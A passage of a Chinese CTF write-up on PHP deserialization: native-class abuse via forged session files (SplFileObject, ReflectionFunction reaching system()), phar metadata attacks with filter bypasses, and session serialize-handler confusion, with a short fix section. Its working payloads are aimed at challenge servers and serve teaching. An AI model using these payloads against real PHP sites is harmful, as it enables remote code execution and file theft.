=&gt; $value){ $path = $value; $name = $key; } echo \"&lt;a style='color:#ff6347' href='$path'&gt;$name&lt;/a&gt; \"; return $name; } function green($fileinfo){ foreach($fileinfo as $key =&gt; $value){ $path = $value; $name = $key; } echo \"&lt;a style='color:#32cd32' href='$path'&gt;$name&lt;/a&gt; \"; return $name; } class file{ public $path; function __construct($path) { $this-&gt;path = $path; } function __toString() { return basename($this-&gt;path); } } index.php &lt;?php include('class.php'); if(!(isset($_SESSION['func']))) { $_SESSION['func'] = 'showfile'; } if(!(isset($_SESSION['files']))) { $_SESSION['files'] = array(); } if(!(isset($_SESSION['paths']))) { $_SESSION['paths'] = array(); } if(isset($_POST['filename'])&amp;&amp;isset($_POST['content'])){ if(stristr($_POST['filename'], 'h')){ die('no h!'); } $filepath = './files/'.$_POST['filename']; $filename = basename($_POST['filename']); file_put_contents($filepath,$_POST['content']); $_SESSION['files'][$filename] = $filepath; $_SESSION['paths'][$filepath] = 'file'; header('Location:/?file='.$filename); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;upload&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;h3&gt;upload your file below&lt;/h3&gt; &lt;form action=\"index.php\" method=\"post\"&gt; &lt;input type=\"text\" name=\"filename\" value=\"filename\" style=\"width: 600px;\"&gt; &lt;/br&gt; &lt;/br&gt; &lt;textarea type=\"text\" name=\"content\" style=\"width: 600px;height: 300px;\" &gt;&lt;/textarea&gt; &lt;/br&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;h4&gt;beatiful front&lt;/h4&gt; &lt;/div&gt; &lt;?php if(rand(0,2)&gt;1){ $showfile = 'red'; } else{ $showfile ='green'; } $filelist = array(); foreach ($_SESSION['paths'] as $path=&gt;$class){ $temp = new $class($path); if($class=='file'){ $filelist[] = (string)$temp; } else{ $filelist[] = $temp; } } $out = '&lt;p&gt;your file:'; foreach ($filelist as $value){ $out .= $value.' '; } echo $out.'&lt;/p&gt;'; if(isset($_GET['file'])){ if(isset($_SESSION['files'][$_GET['file']])) { //GET方法读取文件名，从session的文件名字里面寻找 $pathinfo = array($_GET['file']=&gt;$_SESSION['files'][$_GET['file']]); ${$_SESSION['func']}($pathinfo); } else{ echo 'no such file!'; } } ?&gt; &lt;/body&gt; &lt;/html&gt; info.php &lt;?php phpinfo(); 分析题目 首先是index页面 这里能够让用户填写文件的文件名和内容，然后提交，提交的文件正常情况下会保存在./files目录下，看一下后台是怎么对文件进行操作的： if(isset($_POST['filename'])&amp;&amp;isset($_POST['content'])){ if(stristr($_POST['filename'], 'h')){ // 对文件名有h字符的进行过滤 die('no h!'); } $filepath = './files/'.$_POST['filename']; // 这里可以目录穿越 $filename = basename($_POST['filename']); // basename()函数获取文件名字 file_put_contents($filepath,$_POST['content']); 通过分析可以发现我们上传的文件存在目录穿越的问题，我们能通过filename=../xxxx这种方式将文件保存的路径穿越到服务器的任意路径下，但是由于存在对文件名h字符的过滤，因此无法直接传一个php文件到网站根目录下执行，得另寻僻径。 .user.ini（无果） 既然过滤掉了h字符，意味着.htaccess这样的修改配置文件意味着行不通，但是我想起了另外一个修改配置的文件.user.ini。.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。 但是不是php.ini中的每个变量都能通过ini_set()或者.user.ini和.htaccess来设置，简单的来说每个变量有它所属于的模式，下面官方手册的四个模式 通过上表，看到PHP_INI_USER模式中提到，可以在.user.ini中设定。但实际上，只要不是PHP_INI_SYSTEM模式下的属性，均可以在.user.ini中设置。 那配置文件应该怎么写呢，这里有官方的配置选项列表：php.ini 配置选项列表 在文件上传的题目中，我们只需记住这两个选项即可： auto_prepend_file = xxx // 在每个文件头添加上指定文件的内容，相当于include(xxx) user_ini.cache_ttl = xx // 设置配置的生效时间，默认300秒 于是我们就想是否能够通过上传一个一句话木马文件，然后再目录穿越将.user.ini上传到网站根目录下，内容是让其他文件都包含这个一句话木马，从而实现getshell，但是尝试了很多次都无果，由此猜测运行的模式是PHP_INI_SYSTEM导致了.user.ini无法生效。 SplFileObject类读文件 比赛的时候做到这里其实已经没思路了（还是题目刷得少啊），赛后看有通过SplFileObject 类来读文件得思路，那先得了解一下SplFileObject 类是个什么玩意。 SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php 该类的构造方法可以构造一个新的文件对象用于后续的读取。 我们可以像类似下面这样去读取一个文件的一行： &lt;?php $context = new SplFileObject('/etc/passwd'); echo $context; // 输出 root:x:0:0:root:/root:/bin/bash 但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历： &lt;?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } session反序列化 那么我们知道了这个类之后有什么用呢，似乎找不到可以用的地方啊，想想文件中是不是还有一个文件我们都没用上，其中必然藏有解题的关键。 $_SESSION['files'][$filename] = $filepath; // 将带有路径的文件名字作为键，文件路径作为值 $_SESSION['paths'][$filepath] = 'file'; // 将文件目录作为键，'file'作为值 header('Location:/?file='.$filename); } 这里把文件的名字和路径都存到了SESSION里面，但是我们能够看到$_SESSION['paths'][$filepath]的值是被写死了，我们无法控制，然后接着往下看 $filelist = array(); foreach ($_SESSION['paths'] as $path=&gt;$class){ // 将每一个文件的路径赋值给$path,将'file'赋值给$class $temp = new $class($path); // 相当于new file(文件的路径) if($class=='file'){ // 存在$class不等于file的情况吗？？？？ $filelist[] = (string)$temp; //将返回的文件名赋值给列表 } else{ $filelist[] = $temp; } } $out = '&lt;p&gt;your file:'; foreach ($filelist as $value){ $out .= $value.' '; //从列表中读取输出文件名 } echo $out.'&lt;/p&gt;'; 我们可以看到，这里从$_SESSION['paths']数组里面把每一个键（文件的路径）赋值给$path,将值'file'赋值给$class，然后重点就来了，这里用动态调用的方法新建了一个类对象，看到这里是不是觉得很奇怪，在上一段代码中，已经把每一个$_SESSION['paths']的值已经写死了为'file'了，为什么这里要动态调用而不是直接new file($path)这种更直接的方式呢，这里很明显有问题。接着往下看，这里又用if()来判断$class的值是否是'file'，这就更加明显了了，$class的值必然又猫腻，看回代码，最后是将新建的类对象赋值给一个临时变量，然后再通过循环输出每一个值，看到这里是不是有点熟悉，这不就是SplFileObject类需要循环来输出每一行的值吗？于是这里几乎能肯定是通过将$class的值变成SplFileObject，来获取文件的内容。 既然是读取SESSION的内容，那我是否能够改变SESSION的内容呢？结合我们目录穿越的漏洞，实际上如果我们知道SESSION保存的路径和SESSION序列化的方法，那么我们实际上可以直接上传一个SESSION文件到指定的目录中，控制SESSION的内容，所以最后一个info.php文件就是让我们看SESSION保存的路径和序列化方法的。 接着就是构造我们的SESSION序列化后的文件 paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";} 这里的键为/flag对应代码中的$path，值为SplFileObject对应$class，组合起来就是SplFileObject('/flag')。然后文件名需要目录穿越到/tmp/sess_[SSID的值] func是一个变量，并未赋值，files变量有一个数组，其中键值filename对应./files/filename，后面的paths同理 这里懵逼了半天，我以为作者想靠PHP序列化引擎反序列化输入的content，弄半天只是将内容插入session文件中，这样由于他是php序列化引擎，将|看做键值分隔符，这样就path做为key，后面是值，那这一切就说通了…，与我所见不同的是，他这已经是目录穿越进入到session文件中了，因此他post写的内容就直接插入session文件，并不会被序列化处理（嗯，大概是这样吧） ReflectionFunction反射类 这里是另外一个能利用的类，这个类能够直接写shell，比上面的只能读文件更加牛逼。这也应该是预期解，题目中所有的代码都用上了。 网上能够搜出来CTF中的用法是： &lt;?php $func = new ReflectionFunction($_GET[m]); echo $func-&gt;invokeArgs(array($_GET[c])); ?&gt; 那这道题里面该怎么用这个类呢，由于要用到这个类里面的invokeArgs()这方法，因此要用到数组去动态调用类里面的方法。 example： class Test{ public function hello($name) { echo \"hello \".$name; } } $t = new Test(); $a = array(0 =&gt; $t,1 =&gt; \"hello\"); $a('john'); // 输出hello john 这里用数组的第一个位置的值是实例化后的类，第二个位置的值是类的方法名，因此我们要的是： $function = new ReflectionFunction('system'); $a = array(0 =&gt; $function,1 =&gt; \"invokeArgs\"); $b = array(0 =&gt; 'whoami'); $a($b); 先实例化ReflectionFunction类对象，然后再构造出这两个数组，最后找到一个能够动态调用的地方。 再看回题目，我们在之前的分析中已经能实现能够实例化自己想要的类了。 paths|a:1:{s::\"system\";s::\"ReflectionFunction\";} 那怎么构造出第一个数组呢，再看回这段代码： $filelist = array(); foreach ($_SESSION['paths'] as $path=&gt;$class){ // 将每一个文件的路径赋值给$path,将'file'赋值给$class $temp = new $class($path); // 相当于new file(文件的路径) if($class=='file'){ // 存在$class不等于file的情况吗？？？？ $filelist[] = (string)$temp; //将返回的文件名赋值给列表 } else{ $filelist[] = $temp; } } 这里已经为我们准备好了一个$filelist数组，在构造ReflectionFunction类对象的时候由于$class不等于字符串'file'，因此是直接放进了数组中，然后数组第二位我们需要是'invokeArgs'这个字符串，因此我们可以让$class='file'同时让$path='invokeArgs'，这样就能够返回一串字符串添加进数组里面，从而完成第一个数组的构造！ paths|a:2:{s:6:\"system\";s:18:\"ReflectionFunction\";s:10:\"invokeArgs\";s:4:\"file\";} 得到$filelist = array(0 =&gt; $temp,1 =&gt; \"invokeArgs\"); 接下来就是构造第二个数组，和动态调用类方法。 if(isset($_GET['file'])){ if(isset($_SESSION['files'][$_GET['file']])) { //GET方法读取文件名，从session的文件名字里面寻找 $pathinfo = array($_GET['file']=&gt;$_SESSION['files'][$_GET['file']]); // 构造数组 ${$_SESSION['func']}($pathinfo); // 动态调用！！ } else{ echo 'no such file!'; } } 可以看到$pathinfo这里为我们构造了一个数组，并且数组的键是从GET方法获取的，而值又是从SESSION中的files数组里面找的，因此我们同样能够控制。 files|a:1:{i:0;s:6:\"whoami\";} 当使用GET方法去传递file=0这个参数的时候就能够构造出$pathinfo = array(0=&gt;'whoami')。 最后是动态调用，这里同样是从SESSION中的func参数中获取值进行动态调用，因此我们只需构造$_SESSION['func']='filelist'即可 func|s:8:\"filelist\" 综上所述，我们写进SESSION文件里面的内容是 func|s:8:\"filelist\";files|a:1:{i:0;s:6:\"whoami\";}paths|a:2:{s:6:\"system\";s:18:\"ReflectionFunction\";s:10:\"invokeArgs\";s:4:\"file\";} 这样就能够getshell了。 修复 修就很简单了，既然是因为目录穿越导致能够控制SESSION的内容，那么修掉目录穿越的地方就好了： if(isset($_POST['filename'])&amp;&amp;isset($_POST['content'])){ if(stristr($_POST['filename'], 'h')){ die('no h!'); } $filename = basename($_POST['filename']); $filepath = './files/'.$filename; //去掉了post，导致不可控，也就不能穿越了 file_put_contents($filepath,$_POST['content']); ?&gt; 参考：https://johnfrod.top/安全/ctf-中-php原生类的利用/ 0x11 Phar反序列化 ctfshow 276 phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操 作函数调用phar文件时，会自动反序列化meta-data内的内容。 11.1 什么是phar文件 在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像， 样式表等）捆绑到一个归档文件中来实现应用程序和库的分发 php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如 (fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。 php中一些常见的流包装器如下： file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 11.2 phar文件的结构 1.stub 格式为：xxx&lt;?php xxx; __HALT_COMPILER();?&gt; 前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，这部分的目的就是让 phar 扩展识别这是一个标准的 phar 文件 phar文件标志，必须包含&lt;?php __HALT_COMPILER(); ?&gt;,PHP结束标志?&gt;可以省略，但语句结束符;与stub的结尾之间不能超过两个空格。在生成phar之前应先添加stub.&lt;?php __HALT_COMPILER(); ?&gt;之前也可添加其他内容伪造成其他文件，比如GIF89a&lt;?php __HALT_COMPILER(); ?&gt; manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。 content:这部分就是我们想要压缩在 phar 压缩包内部的文件 signature (可空):签名，放在末尾。 manifest 存放phar归档信息.Manifest结构如下图 所有未使用的标志保留，供将来使用，并且不得用于存储自定义信息。使用每个文件的元数据功能来存储有关特定文件的自定义信息. 下面生成一个phar文件 前提：开启php.ini中的 phar.readonly = off &lt;?php class Test { } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new Test(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 11.3 漏洞利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 11.4 受影响的函数： https://blog.zsxsoft.com/post/38 php中的大部分与文件操作相关函数在通过phar协议获取数据时会将phar文件的meta-data部分反序列化 受影响的函数列表 fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen fileinode filemtime fileowner fikeperms is_dir is_executable is_file is_link is_readable is_writable is_writeable parse_ini_file copy unlink stat readfile 11.5 绕过方式 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt 当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。 php://filter/read=convert.base64-encode/resource=phar://phar.phar GIF格式验证可以通过在文件头部添加GIF89a绕过 1、$phar-&gt;setStub(“GIF89a”.“”); //设置stub 2、生成一个phar.phar，修改后缀名为phar.g 实战参考：https://xz.aliyun.com/t/6699#toc-4 11.6 从 PHP 源码探索 phar 利用成功的深层原因 1. PHP 流的概念 流的作用是在出发地和目的地之间传输数据。出发地和目的地可以是文件、命令行进程、网络连接、ZIP 或 TAR 压缩文件、临时内存、标准输入或输出，或者是通过 PHP 流封装协议实现的任何其他资源。 如果你读写过文件，就用过流；如果你从 php://stdin 读取过数据，或者把输入写入 php://stdout，也用过流。流为 PHP 的很多 IO 函数提供了底层实现，如 file_get_contents、fopn、fread 和 fwrite 等。PHP 的流函数提供了不同资源的统一接口。 我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。 2. 流封装协议（wrapper） 因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件 虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。 每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：&lt;scheme&gt;://&lt;target&gt;，其中 &lt;scheme&gt; 是流的封装协议，&lt;target&gt; 是流的数据源。 2.1 http://流封装协议 下面使用 HTTP 流封装协议创建了一个与 Flicker API 通信的 PHP 流： &lt;?php $json = file_get_contents( 'http://api.flickr.com/services/feeds/photos_public.gne?format=json' ); 不要以为这是普通的网页 URL，file_get_contents() 函数的字符串参数其实是一个流标识符。http 协议会让 PHP 使用 HTTP 流封装协议，在这个参数中，http 之后是流的目标。 注：很多 PHP 开发者可能并不知道普通的 URL 其实是 PHP 流封装协议标识符的伪装。 2.2 file://流封装协议 我们通常使用 file_get_contents()、fopen()、fwrite() 和 fclose() 等函数读写文件系统，因为 PHP 默认使用的流封装协议是 file://，所以我们很少认为这些函数使用的是 PHP 流。下面的示例演示了使用 file:// 流封装协议创建一个读写 /etc/hosts 文件的流： &lt;?php $handle = fopen('file:///etc/hosts', 'rb'); while (feof($handle) !== TRUE) { echo fgets($handle); } fclose($handle); 我们通常会省略掉 file:// 协议，因为这是 PHP 使用的默认值。 这两段介绍来源于https://laravelacademy.org/post/7459.html，那么这个说明了一个什么问题呢？说明我们PHP 目前的几乎所有的 I/O 操作都是通过流配合流包装器来实现的，因为 PHP 默认的包装器就是 file:// ，虽然你没写，但是底层 PHP 还是通过流包装器实现的。 还有更多 使用 stream_get_wrappers() 获取当前系统注册的全部 wrapper 3. 开始向下挖掘 我们上面说了，phar 文件中存在我们可控的序列化的内容，然后我们又说，这个内容在 文件系统函数 配合 phar:// 的时候能实现反序列化，但是我们没说为什么，这也就是我们这节讨论的重点，所有的原因都能从源代码找到答案 (1)先看一下 Phar 文件源代码部分 因为 Phar 是 PHP 的一个扩展，于是我们在 GitHub 的 php-src/ext/phar/phar.c 去全局搜索 unserailize() 函数 如图所示： (2)但是这个函数为什么能调用呢 这就涉及到了文件系统函数的部分了，我们找一下源码，位置在 Github php-src/ext/standard/file.c 这个文件包含了非常多的文件函数的实现，我们先全局搜索 file_get_contents 如图所示： 然后我们稍微往下翻翻就能发现和处理 wrapper 流相关的函数 如图所示： 我们发现了这个 php)stream_open_wrapper_ex 这个函数能处理我们的 wrapper ，那么其他的类似的函数是不是也是底层调用了这个函数呢？ (3)由此及彼 我们全局搜索一下 fopen()，然后我们看一下具体的实现 如图所示： 是不是很熟悉？这下好了，我们不如把 PHP 源码下载下来，来一个真正的全局搜索 (4)举一反三 我本地使用 sublime text 对整个 PHP 源码进行了扫描，发现了很多很多地方调用了这个函数，其实并不只是我们常见的 文件系统函数 如图所示： 好家伙，太底层了，看不懂了，日后拜读 参考：https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#4-phar-的实战 0x12 php-session反序列化 12.1 session简单介绍 ​ 在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。当第一次访问网站时，**seesion_start()**函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。主要有以下特点： session保存的位置是在服务器端 session通常是要配合cookie使用 因为HTTP的无状态性，服务端产生了session来标识当前的用户状态 本质上，session就是一种可以维持服务器端的数据存储技术。即**session技术就是一种基于后端有别于数据库的临时存储数据的技术** 12.2 session 的存储机制 php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的 session_start();运行之后开启session并且产生一个唯一的32位的session_id 12.3 session文件创建的几个tip 1.代码中有session_start(),会自动创建session文件。 2.如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session（也就创建了session文件），不再需要执行session_start()。但默认情况下，这个选项都是关闭的。 3.session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。 比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(\"session.upload_progress.prefix\")+由我们构造的session.upload_progress.name值组成，最后被写入session文件里。 注意：如果默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空。这时我们就要利用竞争，在session文件内容清空前进行包含利用。 12.4 PHP session工作流程 以PHP为例，理解session的原理 1. PHP脚本使用 session_start()时开启`session`会话，会自动检测`PHPSESSID` - 如果`Cookie`中存在，获取`PHPSESSID` - 如果`Cookie`中不存在，创建一个`PHPSESSID`，并通过响应头以`Cookie`形式保存到浏览器 2. 初始化超全局变量`$_SESSION`为一个空数组 3. PHP通过`PHPSESSID`去指定位置（`PHPSESSID`文件存储位置）匹配对应的文件 - 存在该文件：读取文件内容（通过反序列化方式），将数据存储到`$_SESSION`中 - 不存在该文件： session_start()创建一个`PHPSESSID`命名文件 4. 程序执行结束，将`$_SESSION`中保存的所有数据序列化存储到`PHPSESSID`对应的文件中 具体原理图： 12.5 php.ini中一些session配置 session.save_handler=“” –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen\t–指定会话模块是否在请求开始时启动一个会话默认为0不启动 session.save_path=\"/tmp\" --设置session文件的存储位置 session.auto_start= 0 --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动 session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用 session.upload_progress.cleanup= On --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用 12.6 不同的引擎来处理session文件 1. php处理器 首先来看看默认session.serialize_handler = php时候的序列化结果，代码如下 &lt;?php error_reporting(0); ini_set('session.serialize_handler','php'); session_start(); $_SESSION['session'] = $_GET['session']; ?&gt; php处理器存储格式 键名 竖线 经过 serialize() 函数反序列处理的值 $_SESSION[‘name’]的键名：name | s:7:“xianzhi”; 2. php_binary处理器 使用php_binary处理器，即session.serialize_handler = php_binary &lt;?php error_reporting(0); ini_set('session.serialize_handler','php_binary'); session_start(); $_SESSION['sessionsessionsessionsessionsession'] = $_GET['session']; ?&gt; 为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为#，所以最终的结果如下图所示： 键名的长度对应的 ASCII 字符 键名 经过 serialize() 函数反序列处理的值. $ sessionsessionsessionsessionsession s:7:“xianzhi”; 3. php_serialize 处理器 使用php_binary处理器，即session.serialize_handler = php_serialize &lt;?php error_reporting(0); ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['session'] = $_GET['session']; ?&gt; 序列化的结果为：a:1:{s:7:\"session\";s:7:\"xianzhi\";} a:1表示$_SESSION数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值 4. session的反序列化漏洞利用 session的反序列化漏洞，就是利用php处理器和php_serialize处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因 php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题 &lt;?php session_start(); $_SESSION['aaa'] = 'bbb'; //aaa|s:3:\"bbb\"; //该引擎使用的是php，会把'|'看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。 &lt;?php ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['aaa'] = 'bbb'; //a:1:{s:3:\"aaa\";s:3:\"bbb\";} //php_serialize引擎只会把'|'当做一个正常的字符。 具体示例分析： 首先创建session.php，使用php_serialize处理器来存储session数据 &lt;?php ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['session'] = $_GET['session']; echo $_SESSION['session']; ?&gt; test.php，使用默认php处理器来存储session数据 &lt;?php session_start(); class f4ke{ public $name; function __wakeup(){ echo \"Who are you?\"; } function __destruct(){ eval($this-&gt;name); } } $str = new f4ke(); ?&gt; 接着，我们构建URL进行访问session.php： http://www.session-serialize.com/session.php?session=|O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";} 打开PHPSESSID文件可看到序列化存储的内容 a:1:{s:7:\"session\";s:45:\"|O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";} 漏洞分析： 在session.php程序执行，我们将|O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";}通过php_serialize处理器序列化保存成PHPSESSID文件； 由于浏览器中保存的PHPSESSID文件名不变，当我们访问test.php，session_start();找到PHPSESSID文件并使用php处理器反序列化文件内容，识别格式即 键名 竖线 经过 serialize() 函数反序列处理的值 a:1:{s:7:“session”;s:45:\" | O:4:“f4ke”:1:{s:4:“name”;s:10:“phpinfo();”;} php处理器会以|作为分隔符，将O:4:\"f4ke\":1:{s:4:\"name\";s:10:\"phpinfo();\";}反序列化，就会触发__wakeup()方法，最后对象销毁执行__destruct()方法中的eval()函数，相当于执行如下： $_SESSION['session'] = new f4ke(); $_SESSION['session']-&gt;name = 'phpinfo();'; 我们访问test.php，即可直接执行phpinfo()函数 CTF例题：PHPINFO 找不到原题，先跟着做一遍 &lt;?php //A webshell is wait for you ini_set('session.serialize_handler', 'php'); session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET['phpinfo'])) { $m = new OowoO(); } else { highlight_string(file_get_contents('index.php')); } ?&gt; 我们可以看到ini_set('session.serialize_handler', 'php')，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上phpinfo参数新建对象触发魔术方法执行phpinfo()函数，进一步查看session.serialize_handler配置 可见php.ini中session.serialize_handler = php_serialize，当前目录中被设置为session.serialize_handler = php，因此存在session反序列化利用的条件 补充知识 phpinfo文件中 local value(局部变量：作用于当前目录程序，会覆盖master value内容):php master value(主变量：php.ini里面的内容):php_serialize 那么我们如何找到代码入口将利用代码写入到session文件？想要写入session文件就得想办法在$_SESSION变量中增加我们可控的输入点 补充知识 Session 上传进度(此特性自 PHP 5.4.0 后可用) 当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 翻译成人话就是，当检测Session 上传进度这一特性是开启状态时，我们可以在客户端写一个文件上传的功能，文件上传的同时，POST一个与php.ini中设置的session.upload_progress.name同名变量PHP_SESSION_UPLOAD_PROGRESS，如下图，即可写入$_SESSION，进一步序列化写入session文件 下面是官方给出的一个文件上传时监测进度例子: &lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"&lt;?php echo ini_get(\"session.upload_progress.name\"); ?&gt;\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; 其中name=\"\"也可以设置为name=\"PHP_SESSION_UPLOAD_PROGRESS\" 在session中存储的上传进度，如下所示: &lt;?php $_SESSION[\"upload_progress_123\"] = array( \"start_time\" =&gt; 1234567890, // The request time 请求时间 \"content_length\" =&gt; 57343257, // POST content length 长度 \"bytes_processed\" =&gt; 453489, // Amount of bytes received and processed 已接收字节 \"done\" =&gt; false, // true when the POST handler has finished, successfully or not 是否上传完成 \"files\" =&gt; array(//上传的文件 0 =&gt; array( \"field_name\" =&gt; \"file1\", // Name of the &lt;input/&gt; field input中设定的变量名 // The following 3 elements equals those in $_FILES \"name\" =&gt; \"foo.avi\", //文件名 \"tmp_name\" =&gt; \"/tmp/phpxxxxxx\", \"error\" =&gt; 0, \"done\" =&gt; true, // True when the POST handler has finished handling this file \"start_time\" =&gt; 1234567890, // When this file has started to be processed \"bytes_processed\" =&gt; 57343250, // Amount of bytes received and processed for this file ), // An other file, not finished uploading, in the same request 1 =&gt; array( \"field_name\" =&gt; \"file2\", \"name\" =&gt; \"bar.avi\", \"tmp_name\" =&gt; NULL, \"error\" =&gt; 0, \"done\" =&gt; false, \"start_time\" =&gt; 1234567899, \"bytes_processed\" =&gt; 54554, ), ) ); 其中，session中的field_name和name都是我们可控的输入点！ 下面我们就开始解题拿到flag 首先，http://web.jarvisoj.com:32784/index.php?phpinfo查询设置 session.upload_progress.enabled = On --表明允许上传进度跟踪，并填充$ _SESSION变量 session.upload_progress.cleanup = Off --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量) 即允许上传进度跟踪且结束后不清除数据，更有利使用session.upload_progress.name来将利用代码写入session文件 构造POST表单提交上传文件 &lt;form action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; 构造序列化字符串作为payload（利用代码） &lt;?php class OowoO { public $mdzz='print_r(scandir(dirname(__FILE__)));'; } $obj = new OowoO(); echo serialize($obj); ?&gt; //O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";} 为了防止\"被转义，我们在payload中加入\\ 